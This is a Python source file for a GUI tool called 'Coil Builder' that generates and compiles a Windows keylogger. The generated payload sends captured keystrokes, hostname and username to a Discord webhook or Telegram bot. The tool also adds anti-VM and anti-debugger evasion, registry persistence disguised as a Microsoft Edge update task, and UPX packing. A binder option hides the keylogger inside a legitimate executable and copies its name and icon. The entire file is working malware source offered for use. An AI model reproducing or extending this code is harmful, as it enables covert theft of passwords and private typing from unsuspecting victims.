import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import subprocess
import os
import sys
import threading
import shutil
import importlib
import ctypes
import base64
import re

def check_and_install_dependencies():
    """Checks for required packages and installs them if missing."""
    dependencies = {'Pillow': 'PIL', 'pynput': 'pynput', 'requests': 'requests', 'pyinstaller': 'PyInstaller'}
    missing = []
    for package, import_name in dependencies.items():
        try:
            importlib.import_module(import_name)
        except ImportError:
            missing.append(package)

    if missing:
        temp_root = tk.Tk()
        temp_root.withdraw()
        messagebox.showinfo("Installing Dependencies", f"Some packages are not installed! Installing: {', '.join(missing)}...")
        
        for package in missing:
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", package],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            except subprocess.CalledProcessError:
                messagebox.showerror("Error", f"Failed to install '{package}'. Please install it manually ('pip install {package}') and restart.")
                temp_root.destroy()
                sys.exit(1)
        
        temp_root.destroy()
        importlib.invalidate_caches()

check_and_install_dependencies()

try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# --- Constants ---
APP_TITLE = "Coil Builder"
APP_GEOMETRY = "520x850"
COIL_ICON_PATH = "packages/coil.ico"
COIL_WATERMARK_PATH = "packages/coil.png"
UPX_PATH = "packages/upx.exe"

VM_PROCESSES = [
    "ProcessHacker.exe", "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe", 
    "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", 
    "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe", "pestudio.exe", 
    "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "vmsrvc.exe", 
    "x32dbg.exe", "x64dbg.exe", "x96dbg.exe", "vmusrvc.exe", "prl_cc.exe", 
    "prl_tools.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", 
    "xenservice.exe", "joeboxserver.exe", "devenv.exe", "IMMUNITYDEBUGGER.EXE", 
    "ImportREC.exe", "reshacker.exe", "windbg.exe", "32dbg.exe", "64dbg.exex", 
    "protection_id.exex", "scylla_x86.exe", "scylla_x64.exe", "scylla.exe", 
    "idau64.exe", "idau.exe", "idaq64.exe", "idaq.exe", "idaq.exe", "idaw.exe", 
    "idag64.exe", "idag.exe", "ida64.exe", "ida.exe", "ollydbg.exe"
]

class CoilBuilderApp:
    def __init__(self, root):
        self.root = root
        self.root.title(APP_TITLE)
        self.root.geometry(APP_GEOMETRY)
        self.root.resizable(False, False)

        if os.path.exists(COIL_ICON_PATH):
            try:
                self.root.iconbitmap(COIL_ICON_PATH)
            except tk.TclError:
                print("Warning: Could not load coil.ico.")

        # --- Variables ---
        self.webhook_url = tk.StringVar()
        self.telegram_bot_token = tk.StringVar()
        self.telegram_chat_id = tk.StringVar()
        self.webhook_type = tk.StringVar(value="Discord")
        self.payload_icon_path = tk.StringVar()
        self.host_exe_path = tk.StringVar()
        self.use_upx = tk.BooleanVar(value=True)
        self.anti_vm = tk.BooleanVar(value=True)
        self.stealth_persistence = tk.BooleanVar(value=True)
        self.debug_mode = tk.BooleanVar(value=False)
        self.injection_enabled = tk.BooleanVar(value=False)
        self.output_name = tk.StringVar(value="payload")

        self.create_widgets()
        self.on_webhook_type_change() # Set initial UI state
        self.on_injection_toggle() # Set initial UI state for injection

    def create_widgets(self):
        main_frame = ttk.Frame(self.root, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # --- Webhook Configuration ---
        webhook_frame = ttk.LabelFrame(main_frame, text="Webhook Configuration", padding="10")
        webhook_frame.pack(fill=tk.X, pady=5)
        webhook_frame.columnconfigure(1, weight=1)
        
        ttk.Label(webhook_frame, text="Type:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        webhook_dropdown = ttk.Combobox(webhook_frame, textvariable=self.webhook_type, values=["Discord", "Telegram"], state="readonly")
        webhook_dropdown.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW)
        webhook_dropdown.bind("<<ComboboxSelected>>", self.on_webhook_type_change)
        self.url_label = ttk.Label(webhook_frame, text="URL:")
        self.url_label.grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.url_entry = ttk.Entry(webhook_frame, textvariable=self.webhook_url, width=50)
        self.url_entry.grid(row=1, column=1, padx=5, pady=5, sticky=tk.EW)
        self.token_label = ttk.Label(webhook_frame, text="Bot Token:")
        self.token_label.grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
        self.token_entry = ttk.Entry(webhook_frame, textvariable=self.telegram_bot_token, width=50)
        self.token_entry.grid(row=2, column=1, padx=5, pady=5, sticky=tk.EW)
        self.chat_id_label = ttk.Label(webhook_frame, text="Chat ID:")
        self.chat_id_label.grid(row=3, column=0, padx=5, pady=5, sticky=tk.W)
        self.chat_id_entry = ttk.Entry(webhook_frame, textvariable=self.telegram_chat_id, width=50)
        self.chat_id_entry.grid(row=3, column=1, padx=5, pady=5, sticky=tk.EW)


        # --- Payload Options ---
        options_frame = ttk.LabelFrame(main_frame, text="Payload Options", padding="10")
        options_frame.pack(fill=tk.X, pady=10)
        options_frame.columnconfigure(1, weight=1)
        
        ttk.Label(options_frame, text="Output EXE Name:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        ttk.Entry(options_frame, textvariable=self.output_name).grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW)
        ttk.Label(options_frame, text="Custom Icon (.ico):").grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.icon_entry = ttk.Entry(options_frame, textvariable=self.payload_icon_path, state="readonly")
        self.icon_entry.grid(row=1, column=1, padx=5, pady=5, sticky=tk.EW)
        ttk.Button(options_frame, text="Browse...", command=self.browse_icon).grid(row=1, column=2, padx=5, pady=5)
        self.add_watermark(options_frame)

        # --- Injection (Binder) ---
        injection_frame = ttk.LabelFrame(main_frame, text="Injection (Binder)", padding="10")
        injection_frame.pack(fill=tk.X, pady=5)
        injection_frame.columnconfigure(1, weight=1)

        ttk.Checkbutton(injection_frame, text="Enable Injection (bind payload to another EXE)", variable=self.injection_enabled, command=self.on_injection_toggle).grid(row=0, column=0, columnspan=3, sticky=tk.W, pady=(0,5))
        
        self.host_label = ttk.Label(injection_frame, text="Host EXE:")
        self.host_label.grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.host_entry = ttk.Entry(injection_frame, textvariable=self.host_exe_path, state="readonly")
        self.host_entry.grid(row=1, column=1, padx=5, pady=5, sticky=tk.EW)
        self.host_button = ttk.Button(injection_frame, text="Browse...", command=self.browse_host_exe)
        self.host_button.grid(row=1, column=2, padx=5, pady=5)

        # --- Toggles ---
        check_frame = ttk.LabelFrame(main_frame, text="Toggles", padding="10")
        check_frame.pack(fill=tk.X, pady=5)
        
        ttk.Checkbutton(check_frame, text="Compress with UPX (requires upx.exe)", variable=self.use_upx).pack(anchor=tk.W, pady=2)
        ttk.Checkbutton(check_frame, text="Enable Anti-VM / Anti-Debugging Checks", variable=self.anti_vm).pack(anchor=tk.W, pady=2)
        ttk.Checkbutton(check_frame, text="Enable Stealth & Startup Persistence", variable=self.stealth_persistence).pack(anchor=tk.W, pady=2)
        ttk.Checkbutton(check_frame, text="Enable Debug Mode (logs errors to C:\\Users\\Public\\coil_debug.log)", variable=self.debug_mode).pack(anchor=tk.W, pady=2)

        # --- Build Button & Log ---
        ttk.Button(main_frame, text="Build Payload", command=self.start_build_thread).pack(pady=20, fill=tk.X, ipady=5)
        self.log_text = tk.Text(main_frame, height=8, state="disabled", bg="#f0f0f0", wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)

    def on_webhook_type_change(self, event=None):
        if self.webhook_type.get() == "Discord":
            self.url_label.grid()
            self.url_entry.grid()
            self.token_label.grid_remove()
            self.token_entry.grid_remove()
            self.chat_id_label.grid_remove()
            self.chat_id_entry.grid_remove()
        else: # Telegram
            self.url_label.grid_remove()
            self.url_entry.grid_remove()
            self.token_label.grid()
            self.token_entry.grid()
            self.chat_id_label.grid()
            self.chat_id_entry.grid()

    def on_injection_toggle(self):
        if self.injection_enabled.get():
            self.host_label.grid()
            self.host_entry.grid()
            self.host_button.grid()
        else:
            self.host_label.grid_remove()
            self.host_entry.grid_remove()
            self.host_button.grid_remove()

    def add_watermark(self, parent_frame):
        if not PIL_AVAILABLE or not os.path.exists(COIL_WATERMARK_PATH): return
        try:
            bg_color = self.root.cget('bg')
            watermark_frame = tk.Frame(parent_frame, bg=bg_color)
            watermark_frame.grid(row=2, column=0, columnspan=3, pady=10, sticky='e')
            img = Image.open(COIL_WATERMARK_PATH).convert("RGBA")
            img = img.resize((48, 48), Image.Resampling.LANCZOS)
            new_data = []
            for item in img.getdata():
                new_data.append((item[0], item[1], item[2], int(item[3] * 0.35)))
            img.putdata(new_data)
            self.watermark_image = ImageTk.PhotoImage(img)
            text_frame = tk.Frame(watermark_frame, bg=bg_color)
            text_frame.pack(side=tk.RIGHT, padx=(10, 0))
            image_label = tk.Label(watermark_frame, image=self.watermark_image, bd=0, bg=bg_color)
            image_label.pack(side=tk.RIGHT)
            font_style, text_color = ("Segoe UI", 7), "#888888"
            ttk.Label(text_frame, text="Coil 1.0.0", font=font_style, foreground=text_color, background=bg_color).pack(anchor='e')
            ttk.Label(text_frame, text="Created by errorrail", font=font_style, foreground=text_color, background=bg_color).pack(anchor='e')
        except Exception as e:
            print(f"Error adding watermark: {e}")

    def log(self, message):
        self.root.after(0, self._log_update, message)

    def _log_update(self, message):
        self.log_text.config(state="normal")
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)
        self.log_text.config(state="disabled")

    def browse_icon(self):
        filepath = filedialog.askopenfilename(title="Select Icon File", filetypes=(("Icon files", "*.ico"), ("All files", "*.*")))
        if filepath:
            self.payload_icon_path.set(filepath)
            self.log(f"Selected icon: {filepath}")

    def browse_host_exe(self):
        filepath = filedialog.askopenfilename(title="Select Host EXE", filetypes=(("Executable files", "*.exe"), ("All files", "*.*")))
        if filepath:
            self.host_exe_path.set(filepath)
            self.log(f"Selected host EXE: {filepath}")

            # Automatically set the output name and icon to match the host EXE
            basename = os.path.basename(filepath)
            name_no_ext, _ = os.path.splitext(basename)
            
            self.output_name.set(name_no_ext)
            self.log(f"Output name automatically set to: {name_no_ext}")

            # PyInstaller can extract an icon directly from an EXE file.
            # We set the icon path to the host exe itself.
            self.payload_icon_path.set(filepath)
            self.log(f"Icon automatically set to use the icon from: {basename}")

    def start_build_thread(self):
        build_thread = threading.Thread(target=self.build_payload)
        build_thread.daemon = True
        build_thread.start()

    def build_payload(self):
        self.log("Starting build process...")
        # --- Validation ---
        if self.webhook_type.get() == "Discord" and not self.webhook_url.get().strip():
            messagebox.showerror("Error", "Discord Webhook URL is required.")
            return
        if self.webhook_type.get() == "Telegram" and (not self.telegram_bot_token.get().strip() or not self.telegram_chat_id.get().strip()):
            messagebox.showerror("Error", "Telegram Bot Token and Chat ID are required.")
            return
        
        # Updated validation for output name
        output_name = self.output_name.get().strip()
        if not re.match(r'^[\w\.\-]+$', output_name):
             messagebox.showerror("Error", "Output EXE name contains invalid characters.")
             return

        if self.use_upx.get() and not os.path.exists(UPX_PATH):
            messagebox.showerror("Error", f"UPX not found at '{UPX_PATH}'.")
            return
        if self.injection_enabled.get() and not self.host_exe_path.get():
            messagebox.showerror("Error", "Injection is enabled, but no host EXE was selected.")
            return

        # --- Build Logic ---
        if self.injection_enabled.get():
            self.build_injected_payload()
        else:
            self.build_standalone_payload()

    def compile_script(self, script_path, output_name, use_icon=True):
        self.log(f"Compiling {script_path} to {output_name}.exe...")
        pyinstaller_cmd = [sys.executable, '-m', 'PyInstaller', '--onefile', '--noconsole', '--name', output_name]
        
        # If an icon path is set (either manually to an .ico or automatically to an .exe), use it.
        icon_path = self.payload_icon_path.get()
        if use_icon and icon_path and os.path.exists(icon_path):
            pyinstaller_cmd.extend(['--icon', icon_path])
        
        pyinstaller_cmd.append(script_path)

        try:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            process = subprocess.Popen(pyinstaller_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, startupinfo=si, encoding='utf-8', errors='ignore')
            stdout, stderr = process.communicate()
            if process.returncode != 0:
                self.log(f"PyInstaller failed!\nSTDOUT: {stdout}\nSTDERR: {stderr}")
                messagebox.showerror("PyInstaller Error", "Failed to compile. Check log for details.")
                return None
            self.log("PyInstaller compilation successful.")
            return os.path.join('dist', f"{output_name}.exe")
        except Exception as e:
            self.log(f"Compilation error: {e}")
            messagebox.showerror("Error", f"An unexpected error occurred during compilation: {e}")
            return None

    def build_standalone_payload(self):
        self.log("Generating standalone payload source code...")
        try:
            payload_code = self.generate_payload_source()
            with open("payload_temp.py", "w", encoding="utf-8") as f: f.write(payload_code)
            self.log("Payload source code generated successfully.")
        except Exception as e:
            self.log(f"Error generating payload code: {e}")
            messagebox.showerror("Error", f"Failed to generate payload code: {e}\n\nIf this error persists, please report it.")
            return

        exe_path = self.compile_script("payload_temp.py", self.output_name.get().strip())
        if not exe_path: return

        self.post_build_actions(exe_path)

    def build_injected_payload(self):
        self.log("Starting injection build process...")
        # 1. Build the keylogger payload first
        self.log("Building temporary keylogger payload...")
        try:
            payload_code = self.generate_payload_source()
            with open("payload_temp.py", "w", encoding="utf-8") as f: f.write(payload_code)
        except Exception as e:
            self.log(f"Error generating payload code: {e}")
            return
        
        temp_payload_name = "temp_coil_payload"
        temp_payload_path = self.compile_script("payload_temp.py", temp_payload_name, use_icon=False)
        if not temp_payload_path:
            self.log("Failed to build temporary payload. Aborting injection.")
            return
        
        # 2. Generate the loader/binder script
        self.log("Generating binder source code...")
        try:
            loader_code = self.generate_loader_source(self.host_exe_path.get(), temp_payload_path)
            with open("loader_temp.py", "w", encoding="utf-8") as f: f.write(loader_code)
        except Exception as e:
            self.log(f"Error generating loader code: {e}")
            return

        # 3. Compile the loader script
        final_exe_path = self.compile_script("loader_temp.py", self.output_name.get().strip())
        if not final_exe_path: return
        
        self.post_build_actions(final_exe_path)

    def post_build_actions(self, exe_path):
        """Handles UPX compression, cleanup, and icon cache clearing."""
        if self.use_upx.get():
            self.log("Compressing with UPX...")
            try:
                si = subprocess.STARTUPINFO()
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                subprocess.run([UPX_PATH, '--best', '--force', exe_path], check=True, startupinfo=si, capture_output=True)
                self.log("UPX compression successful.")
            except Exception as e:
                self.log(f"UPX compression failed: {e}")

        self.log("Cleaning up temporary files...")
        temp_payload_path = os.path.join('dist', 'temp_coil_payload.exe')
        
        for f in ["payload_temp.py", "loader_temp.py", f"{self.output_name.get().strip()}.spec", "temp_coil_payload.spec", temp_payload_path]:
            if os.path.exists(f):
                try:
                    os.remove(f)
                except OSError as e:
                    self.log(f"Warning: Could not remove temp file {f}: {e}")

        if os.path.exists("build"): shutil.rmtree("build")
        
        self.log(f"------------------------------------\nBuild complete! Payload saved as: {exe_path}\n------------------------------------")
        messagebox.showinfo("Success", f"Payload built successfully!\nFind it in the 'dist' folder.")

        self.log("Attempting to clear icon cache...")
        try:
            bat_content = """@echo off
taskkill /f /im explorer.exe
del /a %localappdata%\\IconCache.db
start explorer.exe
exit
"""
            if not os.path.exists("packages"): os.makedirs("packages")
            bat_path = os.path.join("packages", "RS.bat")
            with open(bat_path, "w") as f: f.write(bat_content)
            abs_bat_path = os.path.abspath(bat_path)
            ctypes.windll.shell32.ShellExecuteW(None, "runas", abs_bat_path, None, None, 1)
            self.log("Cache clearing script executed.")
        except Exception as e:
            self.log(f"Failed to clear icon cache: {e}")
            messagebox.showerror("Cache Clear Error", f"Failed to run the cache clearing script: {e}")

    def generate_loader_source(self, host_path, payload_path):
        """Reads host and payload exes, base64 encodes them, and creates a loader script."""
        with open(host_path, 'rb') as f:
            host_b64 = base64.b64encode(f.read()).decode()
        with open(payload_path, 'rb') as f:
            payload_b64 = base64.b64encode(f.read()).decode()

        loader_template = f'''
import os, sys, subprocess, base64, threading, tempfile

HOST_B64 = "{host_b64}"
PAYLOAD_B64 = "{payload_b64}"

def run_file(file_path):
    try:
        subprocess.Popen(file_path, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        pass

def main():
    temp_dir = tempfile.gettempdir()
    host_path = os.path.join(temp_dir, "host_temp.exe")
    payload_path = os.path.join(temp_dir, "payload_temp.exe")

    try:
        with open(host_path, "wb") as f:
            f.write(base64.b64decode(HOST_B64))
        with open(payload_path, "wb") as f:
            f.write(base64.b64decode(PAYLOAD_B64))
    except Exception:
        sys.exit(1)

    # Run both files in separate threads
    threading.Thread(target=run_file, args=(host_path,), daemon=True).start()
    threading.Thread(target=run_file, args=(payload_path,), daemon=True).start()
    
    # Allow daemons to run
    import time
    time.sleep(5) 

if __name__ == "__main__":
    main()
'''
        return loader_template

    def generate_payload_source(self):
        # Base64 encode URLs and tokens before injecting them into the template
        webhook_url_b64 = base64.b64encode(self.webhook_url.get().encode()).decode()
        bot_token_b64 = base64.b64encode(self.telegram_bot_token.get().encode()).decode()
        telegram_api_b64 = base64.b64encode(b"https://api.telegram.org/bot").decode()

        payload_template = """
import os, sys, requests, threading, time, subprocess, winreg, getpass, socket, base64
from datetime import datetime
try:
    from pynput.keyboard import Key, Listener
except ImportError:
    class Key: pass
    class Listener:
        def __init__(self, *args, **kwargs): pass
        def join(self): time.sleep(3600)

# --- Encoded Configuration ---
WEBHOOK_URL_B64 = "{webhook_url_b64}"
BOT_TOKEN_B64 = "{bot_token_b64}"
TELEGRAM_API_B64 = "{telegram_api_b64}"
CHAT_ID = "{chat_id}"
WEBHOOK_TYPE = "{webhook_type}"
LOG_INTERVAL_SECONDS = 10
ENABLE_ANTI_VM = {enable_anti_vm}
ENABLE_PERSISTENCE = {enable_persistence}
ENABLE_DEBUG_MODE = {enable_debug_mode}
DEBUG_LOG_FILE = os.path.join(os.environ.get("PUBLIC", "C:"), "coil_debug.log")

# --- Globals ---
log_buffer, last_special_key, special_key_count = "", None, 0
stop_logging, buffer_lock = threading.Event(), threading.Lock()

def debug_log(message):
    if not ENABLE_DEBUG_MODE: return
    try:
        with open(DEBUG_LOG_FILE, "a", encoding="utf-8") as f: f.write(datetime.now().isoformat() + " - " + str(message) + "\\n")
    except: pass

def send_message(payload):
    try:
        if WEBHOOK_TYPE == "Discord":
            url = base64.b64decode(WEBHOOK_URL_B64).decode()
            requests.post(url, json=payload, timeout=10)
        elif WEBHOOK_TYPE == "Telegram":
            api_base = base64.b64decode(TELEGRAM_API_B64).decode()
            bot_token = base64.b64decode(BOT_TOKEN_B64).decode()
            url = api_base + bot_token + "/sendMessage"
            requests.post(url, json=payload, timeout=10)
    except Exception as e:
        debug_log("send_message failed: " + str(e))

def send_connection_notice():
    debug_log("Sending connection notice.")
    try:
        hostname, username = socket.gethostname(), getpass.getuser()
        if WEBHOOK_TYPE == "Discord":
            description_string = ":desktop: **PC Name:** `" + hostname + "`\\n:bust_in_silhouette: **User:** `" + username + "`"
            payload = {{"embeds": [{{"title": "Coil Connection Established", "description": description_string, "color": 3066993, "footer": {{"text": "A new host has come online."}}}}]}}
        else: # Telegram
            message = "**Coil Connection Established**\\nPC Name: " + hostname + "\\nUser: " + username
            payload = {{"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}}
        send_message(payload)
        debug_log("Connection notice sent successfully.")
    except Exception as e:
        debug_log("Failed to send connection notice: " + str(e))

def check_environment():
    if not ENABLE_ANTI_VM: return
    debug_log("Running Anti-VM check...")
    bad_processes = {vm_processes}
    try:
        tasks = subprocess.check_output(['tasklist'], startupinfo=subprocess.STARTUPINFO(dwFlags=subprocess.STARTF_USESHOWWINDOW, wShowWindow=subprocess.SW_HIDE)).decode('utf-8', errors='ignore')
        for process in bad_processes:
            if process.lower() in tasks.lower():
                debug_log("Blacklisted process found: " + process + ". Exiting.")
                sys.exit(0)
    except Exception as e:
        debug_log("Anti-VM check failed: " + str(e))

def setup_persistence():
    if not ENABLE_PERSISTENCE: return
    debug_log("Setting up persistence...")
    try:
        app_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        key_name = "MicrosoftEdgeUpdateTask"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, '"' + app_path + '"')
        debug_log("Persistence set in registry: HKCU\\\\...\\\\Run\\\\" + key_name)
    except Exception as e:
        debug_log("Persistence setup failed: " + str(e))

def flush_special_keys():
    global log_buffer, last_special_key, special_key_count
    if last_special_key:
        if special_key_count > 1:
            log_buffer += '[' + last_special_key + ' ' + str(special_key_count) + 'x]'
        else:
            log_buffer += '[' + last_special_key + ']'
    last_special_key, special_key_count = None, 0

def send_log():
    global log_buffer
    if not stop_logging.is_set(): threading.Timer(LOG_INTERVAL_SECONDS, send_log).start()
    data_to_send = ""
    with buffer_lock:
        flush_special_keys()
        if log_buffer:
            data_to_send, log_buffer = log_buffer, ""
    if not data_to_send: return
    debug_log("Attempting to send log of length " + str(len(data_to_send)))
    try:
        if WEBHOOK_TYPE == "Discord":
            payload = {{"content": "```\\n" + data_to_send + "\\n```"}}
        else: # Telegram
            payload = {{"chat_id": CHAT_ID, "text": "```\\n" + data_to_send + "\\n```", "parse_mode": "Markdown"}}
        send_message(payload)
    except Exception as e:
        debug_log("Webhook request exception: " + str(e))
        with buffer_lock: log_buffer = data_to_send + log_buffer

def on_press(key):
    global log_buffer, last_special_key, special_key_count
    if key in [Key.shift, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r, Key.cmd]: return
    with buffer_lock:
        try:
            flush_special_keys()
            log_buffer += str(key.char)
        except AttributeError:
            special_key_name = str(key).replace("Key.", "").upper()
            if special_key_name in ['SPACE', 'ENTER']:
                flush_special_keys()
                log_buffer += ' ' if special_key_name == 'SPACE' else '[ENTER]\\n'
            else:
                if special_key_name == last_special_key:
                    special_key_count += 1
                else:
                    flush_special_keys()
                    last_special_key, special_key_count = special_key_name, 1

def start_keylogger():
    debug_log("Starting key listener.")
    if 'pynput' in sys.modules:
        with Listener(on_press=on_press) as listener:
            listener.join()
    else:
        debug_log("pynput not found, keylogger will not function.")

if __name__ == "__main__":
    debug_log("Payload started.")
    threading.Thread(target=send_connection_notice, daemon=True).start()
    check_environment()
    setup_persistence()
    threading.Thread(target=start_keylogger, daemon=True).start()
    send_log()
    try:
        while not stop_logging.is_set(): time.sleep(1)
    except KeyboardInterrupt:
        debug_log("Script interrupted. Exiting.")
        stop_logging.set()
"""
        return payload_template.format(
            webhook_url_b64=webhook_url_b64,
            bot_token_b64=bot_token_b64,
            telegram_api_b64=telegram_api_b64,
            webhook_type=self.webhook_type.get(),
            chat_id=self.telegram_chat_id.get(),
            enable_anti_vm=self.anti_vm.get(),
            enable_persistence=self.stealth_persistence.get(),
            enable_debug_mode=self.debug_mode.get(),
            vm_processes=str(VM_PROCESSES)
        )

if __name__ == "__main__":
    if not os.path.exists("packages"): os.makedirs("packages")
    root = tk.Tk()
    app = CoilBuilderApp(root)
    root.mainloop()
